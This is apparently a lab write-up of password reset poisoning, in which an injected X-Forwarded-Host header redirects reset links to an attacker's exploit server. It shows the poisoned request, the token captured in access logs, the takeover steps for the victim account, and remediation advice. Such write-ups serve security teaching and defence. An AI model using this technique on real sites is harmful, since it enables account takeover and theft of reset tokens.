Vulnerability Research: Password Reset Poisoning via Middleware
Executive Summary

This report demonstrates how an attacker can leverage the X-Forwarded-Host header to manipulate the password reset flow. 
By injecting a malicious host via middleware, the application generates a reset link pointing to an attacker-controlled 
server, allowing for the interception of sensitive password reset tokens.
Environment & Credentials

    Target User: carlos

    Attacker Credentials: wiener:peter

    Tools Used: Burp Suite Professional, Exploit Server (Webhook/Access Logs)

Technical Breakdown
1. Reconnaissance & Header Injection
The initial phase involves mapping the password reset process. By capturing the POST /forgot-password request, we test for
header reflection.
In many configurations, middleware or reverse proxies use the X-Forwarded-Host header to determine the domain for link 
generation. Adding this header to the request confirms that the server trusts the input:
HTTP

POST /forgot-password HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: attacker-exploit-server.net
...
username=wiener

2. Token Interception

Once header support is confirmed, the attack is pivoted toward the victim (carlos). By submitting a reset request for his
account while maintaining the malicious X-Forwarded-Host, the backend generates a legitimate token but wraps it in a URL
pointing to the exploit server.
 Action: Send the poisoned request for user carlos.
 Result: The victim receives an email with a link like: https://attacker-exploit-server.net/forgot-password?temp-forgot-password-token=[TOKEN].

3. Access Log Analysis
Since the victim (or an automated process) interacts with the link, the exploit server captures the incoming request.
Checking the Access Logs of the exploit server reveals a GET request:
GET /forgot-password?temp-forgot-password-token=a1b2c3d4e5...
The temp-forgot-password-token value is extracted from this entry.
4. Account Takeover (ATO)
To finalize the exploit, we use a valid reset URL structure but replace the token with the one intercepted from the logs.

    Navigate to the password reset interface using a known valid path.
    Update the URL parameter: ?temp-forgot-password-token=[INTERCEPTED_TOKEN].
    Submit a new password.
    Authenticate as carlos using the new credentials.
    Remediation Recommendations
  Avoid Trusting Proxy Headers: Do not use X-Forwarded-Host or similar headers for security-sensitive logic like link
  generation.
  Static Base URLs: Hardcode the base URL for emails in the server configuration rather than pulling it dynamically from the request
  metadata.
    Strict Host Matching: Configure the web server or middleware to only accept requests with a recognized, allow-listed Host header.
